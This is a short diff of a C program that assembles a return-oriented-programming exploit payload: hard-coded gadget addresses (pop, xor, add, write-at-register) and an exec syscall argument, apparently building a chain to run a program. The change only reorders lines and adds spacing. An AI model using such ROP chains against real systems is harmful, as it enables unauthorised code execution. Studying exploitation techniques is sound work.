@@ -14,12 +14,16 @@ int main(void)
   char prev_addr[] = "\xc8\x67\xbf\xbf";
 
   char trap[] = "\xe5\xb6\xa9\xbb";
+
   char xor_eax[] = "\xc2\xb3\xa9\xbb";
-  char pop_eax[] = "\xe1\xa0\xb9\xbb";
   char xor_edx[] = "\xd4\xbe\xb3\xbb";
+
+  char pop_eax[] = "\xe1\xa0\xb9\xbb";
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
   char pop_ecx[] = "\x22\xa4\xba\xbb";
+
   char add_dl_al[] = "\x07\x46\xbb\xbb";
+  
   char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb"; 
 
   char exec_arg[] = "\x3b\x01\x01\x01";
